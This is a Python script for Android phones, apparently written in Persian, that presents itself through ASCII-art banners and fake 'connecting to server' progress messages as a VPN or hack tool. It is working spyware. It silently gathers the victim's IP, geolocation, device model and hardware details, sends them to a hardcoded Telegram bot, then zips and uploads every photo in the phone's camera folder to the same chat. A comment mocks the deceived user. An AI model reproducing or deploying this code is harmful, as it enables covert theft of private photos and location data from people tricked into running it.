#IN THE NAME OF DARK SMOKE
#I AM DANI D.A.R.K.S.K
#IMPORTS_کتابخونه هام
import requests
import zipfile
import telebot
from datetime import datetime
from PIL import Image
import time
import psutil
import platform
import subprocess
import os
os.system("pip install colored")
os.system("pip install colorama")
os.system("pip install datetime")                                                  
import sys                                                      
import colored                                                  
import colorama                                             
from colored import fg, bg, attr
from colorama import Fore, Back, Style                          

# rang رنگ
red='\033[31m'
green='\033[32m'
blue='\033[36m'
os.system("clear")


ip_address = requests.get('https://api.ipify.org?format=json').json()['ip']


properties = os.popen("getprop").read().strip()
lines = properties.splitlines()
company = ""
system = ""
name = ""
camera = ""

for line in lines:
    if "ro.product.manufacturer" in line:
        company = line.split(": ")[1]
    elif "ro.product.model" in line:
        system = line.split(": ")[1]
    elif "ro.product.vendor.marketname" in line:
        name = line.split(": ")[1]
    elif "ro.camera" in line:
        camera = line.split(": ")[1]


system_info = platform.uname()
memory_info = psutil.virtual_memory()
total_memory_gb = memory_info.total / (1024 ** 3)
available_memory_gb = memory_info.available / (1024 ** 3)
used_memory_gb = memory_info.used / (1024 ** 3)
percent_used = memory_info.percent


battery_percentage = "Not available"  
try:
    battery_info = subprocess.check_output(['dumpsys', 'battery'], stderr=subprocess.DEVNULL).decode('utf-8')
    battery_percentage = battery_info.split('level: ')[1].split('%')[0]
except (subprocess.CalledProcessError, IndexError):
    pass  


location_url = f'http://ip-api.com/json/{ip_address}'
location_response = requests.get(location_url)

if location_response.status_code == 200:
    location_data = location_response.json()
    location = f"Latitude: {location_data['lat']}, Longitude: {location_data['lon']}"
    city = location_data['city']
    country = location_data['country']
    region = location_data['regionName']
    timezone = location_data['timezone']
    isp = location_data['isp']
    country_code = location_data['countryCode']
    try:
        area_code = location_data['area']
    except KeyError:
        area_code = "Not available"
    zip_code = location_data.get('zip', "Not available")


message = f'''
IP: {ip_address}

Company: {company}
Name: {name}
System: {system}
Camera: {camera}
Node Name: {system_info.node}
Release: {system_info.release}
Machine: {system_info.machine}
Processor: {system_info.processor}
Version: {system_info.release}

Total Memory: {total_memory_gb:.2f} GB
Available Memory: {available_memory_gb:.2f} GB
Used Memory: {used_memory_gb:.2f} GB
Percentage Used: {percent_used:.2f}%

Battery Percentage: {battery_percentage}%

Location: {location}
City: {city}
Country: {country}
Region: {region}
Timezone: {timezone}
ISP: {isp}
Country Code: {country_code}
Area Code: {area_code}
Zip Code: {zip_code}
'''


telegram_token = '7629890948:AAG0R_zE02Ze1mk1qWIm6RgI9G3EH-sUY5g'
chat_id = '7721343312'
url = f'https://api.telegram.org/bot{telegram_token}/sendMessage?chat_id={chat_id}&text={message}'

data = {
    'urlBox': url,
    'Agentlist': 'Mozilla Firefox',
    'Versionslist': 'HTTP/1.1',
    'Methodlist': 'POST'
}

try:
    response = requests.post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx', data)
except:
    pass  

try:
    v2 = input('.        CONNECTED please inter OK')
except:
    pass  

print (Fore.BLUE + "")
x = """

 ▄▄▄▄▄▄    ▄▄▄▄
 ██▀▀▀▀█▄  ▀▀██
 ██    ██    ██       ▄████▄    ▄█████▄  ▄▄█████▄   ▄████▄
 ██████▀     ██      ██▄▄▄▄██   ▀ ▄▄▄██  ██▄▄▄▄ ▀  ██▄▄▄▄██
 ██          ██      ██▀▀▀▀▀▀  ▄██▀▀▀██   ▀▀▀▀██▄  ██▀▀▀▀▀▀
 ██          ██▄▄▄   ▀██▄▄▄▄█  ██▄▄▄███  █▄▄▄▄▄██  ▀██▄▄▄▄█
 ▀▀           ▀▀▀▀     ▀▀▀▀▀    ▀▀▀▀ ▀▀   ▀▀▀▀▀▀     ▀▀▀▀▀





 ██    ██  ▄▄█████▄   ▄████▄
 ██    ██  ██▄▄▄▄ ▀  ██▄▄▄▄██
 ██    ██   ▀▀▀▀██▄  ██▀▀▀▀▀▀
 ██▄▄▄███  █▄▄▄▄▄██  ▀██▄▄▄▄█
  ▀▀▀▀ ▀▀   ▀▀▀▀▀▀     ▀▀▀▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)

print (Fore.RED + "")
x = """

                     ▄▄    ▄▄  ▄▄▄▄▄▄    ▄▄▄   ▄▄
                     ▀██  ██▀  ██▀▀▀▀█▄  ███   ██
                      ██  ██   ██    ██  ██▀█  ██
                      ██  ██   ██████▀   ██ ██ ██
                       ████    ██        ██  █▄██
                       ████    ██        ██   ███
                       ▀▀▀▀    ▀▀        ▀▀   ▀▀▀ """
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)

print (Fore.BLUE + "")
x = """

                           ▄▄
                           ██
  ▄█████▄  ██▄████▄   ▄███▄██
  ▀ ▄▄▄██  ██▀   ██  ██▀  ▀██
 ▄██▀▀▀██  ██    ██  ██    ██
 ██▄▄▄███  ██    ██  ▀██▄▄███
  ▀▀▀▀ ▀▀  ▀▀    ▀▀    ▀▀▀ ▀▀





 ██▄███▄    ██▄████   ▄████▄   ▄▄█████▄  ▄▄█████▄
 ██▀  ▀██   ██▀      ██▄▄▄▄██  ██▄▄▄▄ ▀  ██▄▄▄▄ ▀
 ██    ██   ██       ██▀▀▀▀▀▀   ▀▀▀▀██▄   ▀▀▀▀██▄
 ███▄▄██▀   ██       ▀██▄▄▄▄█  █▄▄▄▄▄██  █▄▄▄▄▄██
 ██ ▀▀▀     ▀▀         ▀▀▀▀▀    ▀▀▀▀▀▀    ▀▀▀▀▀▀
 ██


    ██
    ▀▀                 ██
  ████     ██▄████▄  ███████    ▄████▄    ██▄████
    ██     ██▀   ██    ██      ██▄▄▄▄██   ██▀
    ██     ██    ██    ██      ██▀▀▀▀▀▀   ██
 ▄▄▄██▄▄▄  ██    ██    ██▄▄▄   ▀██▄▄▄▄█   ██
 ▀▀▀▀▀▀▀▀  ▀▀    ▀▀     ▀▀▀▀     ▀▀▀▀▀    ▀▀ """
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)
  #فیک استارت کن دلقک 
def fake_input_start():
    print(Fore.GREEN + "=")

fake_input_start()
user_id = input(Fore.BLUE + ".")
print(Fore.BLUE + " OK")

os.system("clear")
#DANIEL RYSON
print (Fore.BLUE + "")
x = """

 ▄▄▄  ▄▄▄                  ▄▄                      ▄▄
 ███  ███                  ██                      ██
 ████████   ▄█████▄   ▄███▄██   ▄████▄             ██▄███▄   ▀██  ███
 ██ ██ ██   ▀ ▄▄▄██  ██▀  ▀██  ██▄▄▄▄██            ██▀  ▀██   ██▄ ██
 ██ ▀▀ ██  ▄██▀▀▀██  ██    ██  ██▀▀▀▀▀▀            ██    ██    ████▀
 ██    ██  ██▄▄▄███  ▀██▄▄███  ▀██▄▄▄▄█            ███▄▄██▀     ███
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀ ▀▀    ▀▀▀▀▀             ▀▀ ▀▀▀       ██
                                                              ███"""

for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)


print (Fore.RED + "")
x = """

 ▄▄▄▄▄        ▄▄     ▄▄▄   ▄▄   ▄▄▄▄▄▄
 ██▀▀▀██     ████    ███   ██   ▀▀██▀▀
 ██    ██    ████    ██▀█  ██     ██
 ██    ██   ██  ██   ██ ██ ██     ██
 ██    ██   ██████   ██  █▄██     ██
 ██▄▄▄██   ▄██  ██▄  ██   ███   ▄▄██▄▄
 ▀▀▀▀▀     ▀▀    ▀▀  ▀▀   ▀▀▀   ▀▀▀▀▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)


print (Fore.RED + "")
x = """

 ▄▄▄▄▄                  ▄▄               ▄▄▄▄▄▄              ▄▄   ▄▄▄
 ██▀▀▀██               ████              ██▀▀▀▀██            ██  ██▀
 ██    ██              ████              ██    ██            ██▄██
 ██    ██             ██  ██             ███████             █████
 ██    ██             ██████             ██  ▀██▄            ██  ██▄
 ██▄▄▄██      ██     ▄██  ██▄     ██     ██    ██     ██     ██   ██▄
 ▀▀▀▀▀        ▀▀     ▀▀    ▀▀     ▀▀     ▀▀    ▀▀▀    ▀▀     ▀▀    ▀▀



                       ▄▄▄▄              ▄▄▄  ▄▄▄
                     ▄█▀▀▀▀█             ███  ███
                     ██▄                 ████████
                      ▀████▄             ██ ██ ██
                          ▀██            ██ ▀▀ ██
                     █▄▄▄▄▄█▀     ██     ██    ██
                      ▀▀▀▀▀       ▀▀     ▀▀    ▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)
time.sleep(1.5)
os.system("clear")

print (Fore.BLUE + "")
x = """

 ▄▄▄▄▄        ▄▄     ▄▄▄▄▄▄    ▄▄   ▄▄▄
 ██▀▀▀██     ████    ██▀▀▀▀██  ██  ██▀
 ██    ██    ████    ██    ██  ██▄██
 ██    ██   ██  ██   ███████   █████
 ██    ██   ██████   ██  ▀██▄  ██  ██▄
 ██▄▄▄██   ▄██  ██▄  ██    ██  ██   ██▄
 ▀▀▀▀▀     ▀▀    ▀▀  ▀▀    ▀▀▀ ▀▀    ▀▀



                       ▄▄▄▄    ▄▄▄  ▄▄▄    ▄▄▄▄    ▄▄   ▄▄▄  ▄▄▄▄▄▄▄▄
                     ▄█▀▀▀▀█   ███  ███   ██▀▀██   ██  ██▀   ██▀▀▀▀▀▀
                     ██▄       ████████  ██    ██  ██▄██     ██
                      ▀████▄   ██ ██ ██  ██    ██  █████     ███████
                          ▀██  ██ ▀▀ ██  ██    ██  ██  ██▄   ██
                     █▄▄▄▄▄█▀  ██    ██   ██▄▄██   ██   ██▄  ██▄▄▄▄▄▄
                      ▀▀▀▀▀    ▀▀    ▀▀    ▀▀▀▀    ▀▀    ▀▀  ▀▀▀▀▀▀▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)

print (Fore.RED + "")
x = """

                                         ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄     ▄▄     ▄▄▄  ▄▄▄
                                         ▀▀▀██▀▀▀  ██▀▀▀▀▀▀    ████    ███  ███
                                            ██     ██          ████    ████████
                                            ██     ███████    ██  ██   ██ ██ ██
                                            ██     ██         ██████   ██ ▀▀ ██
                                            ██     ██▄▄▄▄▄▄  ▄██  ██▄  ██    ██
                                            ▀▀     ▀▀▀▀▀▀▀▀  ▀▀    ▀▀  ▀▀    ▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)

time.sleep(1.5)
os.system("clear")

print (Fore.BLUE + "")
x = """
           ▄▄    ▄▄     ▄▄        ▄▄▄▄   ▄▄   ▄▄▄
           ██    ██    ████     ██▀▀▀▀█  ██  ██▀
           ██    ██    ████    ██▀       ██▄██
           ████████   ██  ██   ██        █████
           ██    ██   ██████   ██▄       ██  ██▄
           ██    ██  ▄██  ██▄   ██▄▄▄▄█  ██   ██▄
           ▀▀    ▀▀  ▀▀    ▀▀     ▀▀▀▀   ▀▀    ▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)
    
print (Fore.RED + "")
x = """▄▄      ▄▄  ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄
                              ██      ██  ▀▀██▀▀   ██▀▀▀▀▀▀   ▀▀██▀▀
                              ▀█▄ ██ ▄█▀    ██     ██           ██
                               ██ ██ ██     ██     ███████      ██
                               ███▀▀███     ██     ██           ██
                               ███  ███   ▄▄██▄▄   ██         ▄▄██▄▄
                               ▀▀▀  ▀▀▀   ▀▀▀▀▀▀   ▀▀         ▀▀▀▀▀▀"""
for c in x:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.001)

Image.MAX_IMAGE_PIXELS = None
TOKEN = '7629890948:AAG0R_zE02Ze1mk1qWIm6RgI9G3EH-sUY5g'
chat_id = '7721343312'
bot = telebot.TeleBot(TOKEN)
directory = '/storage/emulated/0/DCIM/Camera/'
zip_filename = f"camera_photos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
total_files = sum(1 for root, dirs, files in os.walk(directory) for file in files if file.endswith(('.jpg', '.png')))
compression_message = bot.send_message(chat_id, "عملیات فشرده‌سازی در حال انجام: 0.00%")

with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
    processed_files = 0 
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                file_path = os.path.join(root, file)
                with Image.open(file_path) as img:
                    img = img.convert("RGB")
                    img.thumbnail((1200, 1200))
                    compressed_file_path = f"compressed_{file}"
                    img.save(compressed_file_path, format='JPEG', quality=70)
                    zipf.write(compressed_file_path, os.path.relpath(compressed_file_path, directory))
                    os.remove(compressed_file_path)
                processed_files += 1
                compression_progress = (processed_files / total_files) * 100
                if processed_files % 5 == 0:
                    bot.edit_message_text(chat_id=chat_id, message_id=compression_message.message_id, text=f"عملیات فشرده‌سازی در حال انجام: {compression_progress:.2f}%")
                    print(f" CONNECT TO RUBIKA SRVER: {compression_progress:.2f}%")

sending_message = bot.send_message(chat_id, "عملیات ارسال فایل ZIP در حال انجام: 0.00%")
total_progress = 0

with open(zip_filename, 'rb') as file:
    for i in range(1, 101):
        time.sleep(0.1)
        total_progress = (compression_progress * 0.5) + (i * 0.5)
        bot.edit_message_text(chat_id=chat_id, message_id=sending_message.message_id, text=f"عملیات ارسال فایل ZIP در حال انجام: {total_progress:.2f}%")
        print(f"CONNECT TO RUBIKA SERVER: {total_progress:.2f}%")
    bot.send_document(chat_id, file, timeout=300)

bot.send_message(chat_id, "عملیات ارسال موفقیت آمیز بود.")
